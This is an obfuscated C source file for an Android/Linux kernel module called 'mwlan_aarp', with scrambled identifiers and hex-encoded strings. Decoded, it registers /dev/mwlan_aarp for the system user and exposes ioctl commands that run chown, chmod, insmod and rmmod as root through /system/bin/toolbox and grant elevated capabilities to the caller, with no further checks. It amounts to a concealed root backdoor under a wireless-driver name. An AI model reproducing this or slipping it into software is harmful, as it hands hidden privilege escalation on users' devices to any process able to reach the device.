/*
   'mwlan_aarp.c' Obfuscated by COBF (Version 1.06 2006-01-07 by BB) at Mon Oct 29 11:48:27 2012
*/
#include<linux/module.h>
#include<linux/ctype.h>
#include<linux/time.h>
#include"cobf.h"
#ifdef _WIN32
#include"uncobf.h"
#include<wtypes.h>
#include"cobf.h"
#else
#ifdef bb49
#include"uncobf.h"
#include<linux/types.h>
#include"cobf.h"
#else
#include"uncobf.h"
#include<stddef.h>
#include<sys/types.h>
#include"cobf.h"
#endif
#endif
#ifdef _WIN32
bba bb66 bb93;
#else
bba bbd bb65, *bb120, *bb187;
#define bb136 1
#define bb89 0
bba bb193 bb206, *bb238, *bb123;bba bbd bb233, *bb146, *bb227;bba bbw
bb108, *bb97, *bb155;bba bbx bb190, *bb115;bba bbw bbx bb134, *bb140;
bba bbx bb60, *bb149;bba bbw bbx bb24, *bb219;bba bb24 bb185, *bb232;
bba bb24 bb96, *bb235;bba bb60 bb66, *bb109;bba bb228 bb202;bba bb192
bb213;bba bb170 bb70;bba bb81 bb54;bba bb81 bb132;
#ifdef bb236
bba bb147 bb28, *bb72;bba bb94 bb11, *bb47;bba bb196 bbq, *bb42;bba
bb112 bb23, *bb82;
#else
bba bb164 bb28, *bb72;bba bb126 bb11, *bb47;bba bb107 bbq, *bb42;bba
bb139 bb23, *bb82;
#endif
bba bb28 bb22, *bb31, *bb168;bba bb11 bb198, *bb234, *bb172;bba bb11
bb133, *bb203, *bb171;bba bbq bb69, *bb167, *bb201;bba bb70 bb12, *
bb153, *bb98;bba bbq bb239, *bb99, *bb186;bba bb54 bb144, *bb116, *
bb197;bba bb23 bb199, *bb243, *bb188;
#define bb135 bbl
bba bbl*bb223, *bb102;bba bbj bbl*bb178;bba bbc bb111;bba bbc*bb230;
bba bbj bbc*bb183;
#if defined( bb49)
bba bbd bb78;
#endif
bba bb78 bb5;bba bb5*bb106;bba bbj bb5*bb226;
#if defined( bb148) || defined( bb165)
bba bb5 bb20;bba bb5 bb68;
#else
bba bbc bb20;bba bbw bbc bb68;
#endif
bba bbj bb20*bb104;bba bb20*bb131;bba bb69 bb194, *bb231;bba bbl*bb86
;bba bb86*bb180;
#define bb159( bb15) bbg bb15##__ { bbd bb118; }; bba bbg bb15##__  * \
 bb15
bba bbg{bb12 bb143,bb174,bb221,bb216;}bb100, *bb212, *bb160;bba bbg{
bb12 bb225,bb214;}bb156, *bb129, *bb189;bba bbg{bb12 bb90,bb237;}
bb244, *bb215, *bb92;
#endif
bba bbj bb22*bb151;
#ifdef _WIN32
#ifndef UNDER_CE
#define bb6 bb209
#define bb14 bb220
bba bbw bbx bb6;bba bbx bb14;
#endif
#else
#endif
#ifdef _WIN32
bbl*bb33(bb6 bb73);bbl bb26(bbl* );bbl*bb51(bb6 bb217,bb6 bb73);
#else
#define bb33( bbe) bb75(1, bbe, bb32)
#define bb26( bbe) bb173( bbe)
#define bb51( bbe, bb53) bb75( bbe, bb53, bb32)
#endif
#ifdef _WIN32
#define bb25( bbe) bb117( bbe)
#else
#ifdef _DEBUG
bbd bb74(bbj bbc*bb95,bbj bbc*bbz,bbw bb218);
#define bb25( bbe) ( bbl)(( bbe) || ( bb74(# bbe, __FILE__, __LINE__)))
#else
#define bb25( bbe) (( bbl)0)
#endif
#endif
bb14 bb152(bb14*bb91);
#ifndef _WIN32
bbd bb191(bbj bbc*bb101);bbd bb105(bbj bbc*bb177,...);
#endif
#ifdef _WIN32
bba bb145 bb63;
#define bb52( bbe) bb176( bbe)
#define bb76( bbe) bb137( bbe)
#define bb50( bbe) bb103( bbe)
#define bb84( bbe) bb240( bbe)
#else
bba bb207 bb63;
#define bb52( bbe) ( bbl)(  *  bbe = bb222( bbe))
#define bb76( bbe) (( bbl)0)
#define bb50( bbe) bb122( bbe)
#define bb84( bbe) bb208( bbe)
#endif
#include"uncobf.h"
#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/fs.h>
#include<linux/in.h>
#include<linux/miscdevice.h>
#include<linux/syscalls.h>
#include<linux/kmod.h>
#include<net/ip.h>
#include"cobf.h"
bba bbg{bb31 bb71;bbq bb154;bb31 bb29;bbq bb39;bbq bby;}bb17;bba bbg{
bbj bbc*bbh;bb142 bb45;bb124 bb46;}bb43;bba bbg{bbj bbc*bbh;bbd bb18;
}bb40;bba bbg{bb65 bb85;bbj bbc*bb3;}bb41;bba bbg{bbd bb210;bbg bb121
 *bb242;bbd bb195;}bb125;bbm bbd bb59(bbg bb8*bb8,bbg bbz*bbz){bbu 0 ;
}bbm bbd bb62(bbg bb8*bb8,bbg bbz*bbz){bbu 0 ;}bbm bbd bb4(bbc*bbh,bbc
 * *bbn,bbc* *bbr,bbd bb35){bbg bb162*bb19;bb179 bb55=(bb35==bb157)?
bb32:bb113;
#ifdef _DEBUG
bbc* *bb13=bbn;bbf("\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64"
"\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20\x25\x73",bbh);bb67( *bb13){
bbf("\x20\x25\x73", *bb13);bb13++;}bbf("\n");
#endif
bb19=bb128(bbh,bbn,bbr,bb55);bbk(bb19==bbp){bbf("\x63\x61\x6c\x6c\x5f"
"\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20"
"\x69\x6e\x66\x6f\x20\x3d\x3d\x20\x4e\x55\x4c\x4c\n");bbu-bb27;}bbu
bb182(bb19,bb35);}bbm bbd bb79(bbj bbc*bbh,bbd bb57,bbd bb64){bbc bb34
[256 ];bbc*bbn[]={(bbc* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e"
"\x2f\x63\x68\x6f\x77\x6e",bb34,(bbc* )bbh,bbp};bbm bbc*bbr[]={"\x48"
"\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78",""
"\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",
bbp};bbd bbb;bb56(bb34,"\x25\x64\x2e\x25\x64",bb57,bb64);bbb=bb4(""
"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x74\x6f\x6f\x6c\x62"
"\x6f\x78",bbn,bbr,bb16);
#ifdef _DEBUG
bbf("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbb);
#endif
bbu bbb;}bbm bbd bb77(bbj bbc*bbh,bbd bb18){bbc bb37[256 ];bbc*bbn[]={
(bbc* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6d"
"\x6f\x64",bb37,(bbc* )bbh,bbp};bbd bbb;bbm bbc*bbr[]={"\x48\x4f\x4d"
"\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41"
"\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbp};bb56(
bb37,"\x25\x6f",bb18);bbb=bb4("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62"
"\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbn,bbr,bb16);
#ifdef _DEBUG
bbf("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbb);
#endif
bbu bbb;}bbm bbx bb48(bbg bbz*bbz,bbw bbd bb211,bbw bbx bb58){bbq bb44
;bb17 bbo, *bb10=(bb17* )bb58;bb22*bbi=bbp;bbd bbb;bbf("\x6d\x77\x6c"
"\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x62\x65\x67\x69\x6e\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbb=bb2(&bbo,bb10,bb21(bb17));
bbk(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c"
"\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20"
"\x25\x64\n",bbb);bbv bbt;}bbi=bb33(bbo.bb39);bbk(!bbi){bbb=-bb27;bbf
("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x6d\x61"
"\x6c\x6c\x6f\x63\x3a\x20\x25\x64\n",bbb);bbv bbt;}bbb=bb130(bb44,(
bb42)bbo.bb71);bbk(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f"
"\x63\x74\x6c\x2c\x20\x67\x65\x74\x5f\x75\x73\x65\x72\x3a\x20\x25\x64"
"\n",bbb);bbv bbt;}bbb=bb2(bbi,bbo.bb29,bbo.bb39);bbk(bbb!=0 ){bbf(""
"\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70"
"\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);
bbv bbt;}bb119(bb44){bb9 1 :{bb43*bb0=(bb43* )bbi;bbc bbh[256 ];bbb=bb2
(bbh,bb0->bbh,bb21(bbh));bbk(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65"
"\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d"
"\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbo.bby=4 ; * (
(bbq* )bbi)=bb79(bbh,bb0->bb45,bb0->bb46);
#ifdef _DEBUG
bbf("\x63\x68\x6f\x77\x6e\n");
#endif
bb7;}bb9 2 :{bb40*bb0=(bb40* )bbi;bbc bbh[256 ];bbb=bb2(bbh,bb0->bbh,
bb21(bbh));bbk(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63"
"\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65"
"\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbo.bby=4 ; * ((bbq* )bbi)=bb77
(bbh,bb0->bb18);
#ifdef _DEBUG
bbf("\x63\x68\x6d\x6f\x64\n");
#endif
bb7;}bb9 3 :{bb41*bb30=(bb41* )bbi;bbc bb3[256 ];bbc*bbn[]={bbp,bb3,bbp
};bbm bbc*bbr[]={"\x48\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c"
"\x69\x6e\x75\x78","\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d"
"\x2f\x62\x69\x6e",bbp};bbb=bb2(bb3,bb30->bb3,256 );bbk(bbb!=0 ){bbf(""
"\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x4f\x49\x44"
"\x5f\x4d\x4f\x44\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75"
"\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbn[0 ]=bb30->bb85?""
"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x69\x6e\x73\x6d\x6f"
"\x64":"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x72\x6d\x6d"
"\x6f\x64"; * (bbq* )bbi=bb4("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62"
"\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbn,bbr,bb16);bbo.bby=4 ;
#ifdef _DEBUG
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61"
"\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72"
"\x5f\x3a\x20\x25\x64\n", * (bbd* )bbi);
#endif
bb7;}bb9 5 :{bbd bbb;bb175{bbg bb184*bbs=bb224();bbk(!bbs){bbb=bb27;
bb7;}bbs->bb36.bb1[0 ]=(1 <<bb127)|(1 <<bb166)|(1 <<bb88);bbs->bb87.bb1[0
]=0 ;bbs->bb80.bb1[0 ]=bbs->bb36.bb1[0 ];bbs->bb36.bb1[1 ]=0 ;bbs->bb87.
bb1[1 ]=0 ;bbs->bb80.bb1[1 ]=0 ;bbb=bb229(bbs);}bb67(0 ); * (bbd* )bbi=bbb
;bbo.bby=bb21(bbd);
#ifdef _DEBUG
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61"
"\x70\x73\x65\x74\x3a\x20\x25\x64\n",bbb);
#endif
bb7;}}bbb=bb114(bb10->bb29,bbi,bbo.bby);bbk(bbb!=0 ){bbf("\x64\x65\x76"
"\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66"
"\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbt;}
bbb=bb138(bbo.bby,&bb10->bby);bbk(bbb!=0 ){bbf("\x64\x65\x76\x69\x63"
"\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x70\x75\x74\x5f\x75\x73\x65\x72"
"\x2c\x20\x25\x64\n",bbb);bbv bbt;}bbt:bbk(!bbi)bb26(bbi);bbf("\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x65\x6e\x64\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbu bbb;}bbm bbg bb169 bb61={.
bb150=bb48,.bb200=bb59,.bb241=bb62,};bbm bbg bb205 bb38={bb163,"\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70",&bb61};bbd bb204(){bbd bbb;bbb
=bb158(&bb38);bbk(bbb!=0 ){bbf("\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75"
"\x6c\x65\x2c\x20\x6d\x69\x73\x63\x5f\x72\x65\x67\x69\x73\x74\x65\x72"
"\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x25\x64\n",bbb);bbu bbb;}{bbc*
bbn[]={"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6f"
"\x77\x6e","\x73\x79\x73\x74\x65\x6d\x2e\x73\x79\x73\x74\x65\x6d",""
"\x2f\x64\x65\x76\x2f" "\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70",bbp
};bbm bbc*bbr[]={"\x48\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c"
"\x69\x6e\x75\x78","\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d"
"\x2f\x62\x69\x6e",bbp};bbb=bb4("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62"
"\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbn,bbr,bb16);
#ifdef _DEBUG
bbf("\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20\x63\x61\x6c"
"\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f"
"\x3a\x20\x25\x64\n",bbb);
#endif
}bbk(bbb!=0 ){bbf("\x6d\x69\x73\x63\x5f\x72\x65\x67\x69\x73\x74\x65"
"\x72\x20\x66\x61\x69\x6c\x65\x64\x2c\x20\x25\x64\n",bbb);bbu bbb;}
bbf("\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x20\x69\x6e\x69\x74\x5f"
"\x6d\x6f\x64\x75\x6c\x65\x28\x29\x20\x77\x61\x73\x20\x73\x75\x63\x63"
"\x65\x73\x73\x66\x75\x6c\x2e\n");bbu 0 ;}bbl bb141(){bb110(&bb38);}
bb161("\x61\x68\x6f\x70\x65");bb181("");
